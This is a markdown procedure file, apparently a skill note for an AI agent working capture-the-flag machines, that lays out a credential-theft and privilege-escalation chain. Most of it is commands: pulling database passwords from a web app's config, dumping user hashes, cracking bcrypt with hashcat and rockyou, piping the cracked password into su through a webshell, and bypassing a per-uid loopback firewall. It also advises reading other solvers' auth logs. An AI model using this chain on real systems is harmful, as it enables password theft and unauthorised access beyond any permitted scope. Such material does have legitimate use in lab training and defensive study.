# DB hash crack → `su` via webshell → uid-scoped loopback firewall

Trigger: you have a `www-data`-style webshell, a bcrypt/yescrypt hash from a
local DB (`zz_users`, `users`, `wp_users`…), and a localhost-only service the
webshell uid cannot reach (connection times out). Keywords: www-data,
bcrypt, hashcat -m 3200, su without tty, uid-owner iptables, loopback
isolation bypass.

## Procedure

1. Dump the app DB creds from config (`config.inc.php`) and query users:
   `mysql -u brollin -p'…' openstamanager -e 'select username,password from zz_users;'  # e.g. haris:<hash>`
2. Crack the hash in the background (don't block the turn):
   ```bash
   nohup hashcat -m 3200 -a 0 dbuser_bcrypt.txt rockyou.txt \
     --potfile-path dbuser.pot -o dbuser_found.txt --quiet > hashcat.log 2>&1 &
   hashcat -m 3200 --show dbuser_bcrypt.txt   # poll later; CPU ~2k H/s is fine
   ```
   (`-m 3200` bcrypt; `-m 1800` sha512crypt; `-m 500` md5crypt.)
3. Confirm uid 33 is the blocked one, not the service being down: probe the
   same `127.0.0.1:PORT` from another uid if you have one, or compare
   `timeout 3 bash -c 'echo > /dev/tcp/127.0.0.1/PORT'` results. A root
   `iptables -A OUTPUT -m owner --uid-owner www-data -p tcp --dport PORT -j DROP`
   looks exactly like a dead service. Check `auth.log*` of prior solvers for
   the intended user (`Accepted password for …`).
4. **`su` works without a tty when the password arrives on stdin** — no
   `expect` needed:
   ```bash
   # through the webshell:
   printf 'cracked_pw\n' | su -s /bin/bash -c 'id; curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:1337/' appuser
   ```
   `-s /bin/bash` bypasses `nologin` shells *only if the account's shell is a
   real shell*; `nologin`/`false` users still fail (use their app instead).
5. As the new uid, hit the loopback service that timed out before; you should
   now get a response (HTTP 200). Continue in that uid's context — for
   OliveTin see `skills/privesc/olivetin-template-argument-injection.md`.

## Pitfalls

- Don't mark `user`/`root` milestones before proving them — a webshell as
  www-data cannot read `/home/<appuser>/user.txt`; the flag comes after the
  `su` step.
- Piped `su` burns one attempt per call; verify the crack with `--show`
  before firing it.
- The firewall is per-uid, not per-process/service: any second uid (even
  unprivileged) is a full bypass. `sudo -l` may also show a way around.
- MySQL client warnings/password on CLI: prefer `MYSQL_PWD=` or a config
  file read to avoid special-char quoting issues.
